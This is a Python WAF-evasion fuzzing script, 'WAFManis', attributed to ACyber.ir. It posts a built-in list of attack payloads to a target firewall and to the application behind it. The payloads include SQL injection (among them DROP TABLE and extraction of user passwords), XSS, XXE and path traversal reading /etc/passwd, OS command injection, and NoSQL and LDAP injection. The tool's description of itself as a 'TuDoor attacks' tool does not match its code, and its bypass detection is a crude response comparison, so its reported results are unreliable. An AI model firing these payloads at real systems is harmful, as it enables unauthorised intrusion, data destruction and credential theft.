import requests
import argparse
from urllib.parse import urlencode

# Display basic tool information
def display_info():
    info = """
    Developer : ACyber.ir
    Version   : 1.0.1
    Develop Time : 5-10-2024
    """
    print(info)

# Display about information
def show_about():
    about_text = """
    This is a script for testing and executing the TuDoor attacks,
    developed by the A Cyber Security Team.
    """
    print(about_text)

# Expanded list of fuzzing payloads
fuzz_payloads = [
    # SQL Injection payloads
    {"id": "1' or '1'='1"},
    {"id": "1' and '1'='1"},
    {"id": "1; DROP TABLE users;--"},
    {"id": "1' UNION SELECT NULL, NULL, NULL--"},
    {"id": "1' UNION SELECT password, NULL, NULL FROM users--"},
    
    # Cross-site Scripting (XSS) payloads
    {"id": "<script>alert(1)</script>"},
    {"id": "<img src=x onerror=alert(1)>"},
    {"id": "<svg onload=alert(1)>"},
    {"id": "<body onload=alert(1)>"},
    {"id": "<iframe src='javascript:alert(1)'></iframe>"},
    
    # NoSQL Injection payloads
    {"id": "{ $ne: null }"},
    {"id": "{ $gt: '' }"},
    {"id": "{ $regex: '.*' }"},
    
    # XML Injection payloads
    {"id": "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>"},
    
    # Path Traversal payloads
    {"id": "../../../../etc/passwd"},
    {"id": "/etc/passwd"},
    
    # OS Command Injection payloads
    {"id": "1 | ls -la"},
    {"id": "1 & whoami"},
    {"id": "`ping -c 4 127.0.0.1`"},
    
    # Blind SQLi payloads
    {"id": "1' AND IF(1=1, SLEEP(5), 0)--"},
    {"id": "1' AND SLEEP(5)--"},
    
    # LDAP Injection payloads
    {"id": "(&(USER=*)(!(USER=admin)))"},
    {"id": "admin*)((|user=*))"},
]

# Function to send HTTP requests and evaluate the response
def send_request(url, params, content_type):
    headers = {
        "Content-Type": content_type
    }
    response = requests.post(url, data=params, headers=headers)
    return response

# Function to perform fuzzing on the target WAF and web application
def fuzz_waf(waf_url, app_url):
    for payload in fuzz_payloads:
        encoded_params = urlencode(payload)
        
        print(f"Testing payload: {payload}")
        
        # Send the request to WAF
        waf_response = send_request(waf_url, encoded_params, "application/x-www-form-urlencoded")
        
        # Send the request to the web application directly (behind the WAF)
        app_response = send_request(app_url, encoded_params, "application/x-www-form-urlencoded")
        
        # Check if WAF response differs from the application response
        if waf_response.text != app_response.text:
            print(f"WAF bypass detected with payload: {payload}")
            print(f"WAF Response: {waf_response.text}")
            print(f"App Response: {app_response.text}")
        else:
            print(f"WAF successfully blocked the payload: {payload}")
        
        print("-" * 50)

# Function to handle command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="WAFManis: Fuzzing Framework for WAF Evasion")
    parser.add_argument('--target', type=str, help='The WAF URL to test')
    parser.add_argument('--app', type=str, help='The Web Application URL (behind WAF)')
    parser.add_argument('--info', action='store_true', help='Display tool information')
    parser.add_argument('--about', action='store_true', help='Show about the tool')
    return parser.parse_args()

if __name__ == "__main__":
    # Automatically display tool info when the script starts
    display_info()

    # Parse the command-line arguments
    args = parse_arguments()

    # Display about information if --about is provided
    if args.about:
        show_about()

    # Run fuzzing if both WAF and App URLs are provided
    if args.target and args.app:
        fuzz_waf(args.target, args.app)
    else:
        if not args.about:
            print("Please provide the required URLs for --target and --app, or use --about for more information.")
